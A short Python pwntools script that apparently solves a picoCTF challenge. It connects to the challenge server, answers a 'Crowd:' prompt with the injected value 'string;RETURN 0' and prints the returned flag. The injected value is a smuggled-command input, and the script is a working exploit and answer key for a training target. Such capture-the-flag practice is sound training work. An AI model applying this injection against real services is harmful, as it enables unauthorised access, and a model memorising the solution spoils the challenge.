#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'


HOST = 'verbal-sleep.picoctf.net'
PORT = 59898

p = remote(HOST, PORT)

def main():
	# Connect to the server
	p.sendlineafter(b"Crowd: ", b"string;RETURN 0")
	p.recvuntil(b"conquer, ")

	# Get the flag
	flag = p.recvline().decode('utf-8').strip()
	# Close the connection
	p.close()

	print(flag)


if __name__ == "__main__":
	main()